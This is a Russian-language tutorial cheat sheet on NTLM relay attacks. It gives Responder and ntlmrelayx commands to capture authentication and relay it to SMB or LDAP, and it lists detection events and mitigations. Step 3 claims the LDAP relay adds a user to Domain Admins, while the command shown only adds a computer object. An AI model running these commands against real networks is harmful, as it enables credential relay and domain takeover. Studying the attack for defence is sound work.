# NTLM Relay Attack

## 🎯 Цель атаки
Перехват NTLM-аутентификации и её релей (переиспользование) на другой сервис, чтобы выполнить действия от имени жертвы без знания её пароля.

## 📋 Описание
NTLM Relay — это техника, при которой злоумышленник перенаправляет NTLM-аутентификацию жертвы на целевой сервис (SMB, HTTP, LDAP и др.).  
Часто используется в связке с Responder или MITM6 для перехвата хэшей и с Impacket (ntlmrelayx.py) для релея на уязвимые службы.

## ⚠ Условия эксплуатации
- NTLM-аутентификация разрешена в сети.
- На целевом сервисе нет SMB/LDAP signing или он отключён.
- Злоумышленник имеет возможность перехватывать трафик (MITM).

## 🔹 Пошаговое проведение атаки (лаборатория)
> ⚠ Выполнять только в изолированной тестовой среде!

1. Запуск Responder для перехвата NTLM-хэшей:
```bash
responder -I eth0
```
2. Запуск ntlmrelayx для релея на целевой сервис (например, SMB или LDAP):
```bash
ntlmrelayx.py -t smb://target.local -c "whoami"
```
3. Если целевой сервис LDAP — можно создать нового пользователя и добавить его в группу администраторов домена:
```bash
ntlmrelayx.py -t ldap://dc01.domain.local --add-computer
```

## 📊 Признаки в логах и мониторинг
- Аномальные SMB/LDAP подключения от внутренних хостов.
- Логи Windows Security с Event ID **4624** (Logon Type 3) от неожиданных источников.
- Включение/выключение учетных записей или их создание без плановых изменений.

## 🛡 Меры защиты
- Включить SMB/LDAP signing.
- Использовать Kerberos вместо NTLM.
- Ограничить доступ к административным интерфейсам.
- Включить мониторинг Event ID 4624, 4625, 4720, 4728.

## 🔍 Разбор команд

### 1. Запуск Responder
```bash
responder -I eth0
```
- **`-I eth0`** — интерфейс, на котором будет перехватываться трафик.
- Перехватывает NTLM-хэши при LLMNR/NBT-NS запросах.

### 2. Запуск ntlmrelayx для релея на SMB
```bash
ntlmrelayx.py -t smb://target.local -c "whoami"
```
- **`-t smb://target.local`** — цель релея (служба SMB).
- **`-c "whoami"`** — команда, выполняемая на целевом хосте.

### 3. Запуск ntlmrelayx для релея на LDAP и добавления компьютера
```bash
ntlmrelayx.py -t ldap://dc01.domain.local --add-computer
```
- **`--add-computer`** — создаёт новый объект компьютера в домене (может быть использовано для дальнейших атак).
